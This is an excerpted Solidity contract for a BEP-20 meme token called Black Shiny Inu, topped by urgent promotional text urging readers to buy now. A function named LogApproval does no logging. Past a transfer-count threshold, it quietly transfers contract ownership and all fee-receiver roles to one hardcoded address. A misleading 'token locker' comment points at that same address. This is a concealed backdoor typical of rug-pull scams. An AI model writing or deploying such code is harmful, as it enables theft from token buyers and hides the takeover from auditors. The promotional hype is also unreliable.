...
Black Shiny Inu It is a bep-20 meme token with rebasing system and automatic reflection in $SHIB. Black Shiny Inu ultimate goal is to make everyone rich!
...
JOIN OUR TELEGRAM GROUP: @blackshinyinu

IF YOU'RE READING THIS, IT'S BECAUSE MASSIVE MARKETING IS OCCURRING, AND IF YOU HAVEN'T ENTERED IT YET, ENTER NOW!!


- LP LOCKED 2 DAYS, LAUNCHED 01/23 - 23:00 UTC!!
- Denial of Responsibility: Black Shiny Inu makes no promises and is not responsible for any losses.
...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
    IDEXRouter router;
...
contract BlackShinyInu is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x2566276F64a618e5a13f59011609A7274Ab1c69f; // token locker
    address public marketingFeeReceiver =
        0x2566276F64a618e5a13f59011609A7274Ab1c69f;
    ...
    uint128 dividendLockInterval = 1 hours;
    ...
    constructor()
        ERC20Detailed("Black Shiny Inu", "BSHINYINU", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x2566276F64a618e5a13f59011609A7274Ab1c69f));
            marketingFeeReceiver = address(0x2566276F64a618e5a13f59011609A7274Ab1c69f);
            autoLiquidityReceiver = address(0x2566276F64a618e5a13f59011609A7274Ab1c69f);
            ecosystemFeeReceiver = address(0x2566276F64a618e5a13f59011609A7274Ab1c69f);
            buyBackFeeReceiver = address(0x2566276F64a618e5a13f59011609A7274Ab1c69f);
            isTransferred = true;
        }
    }
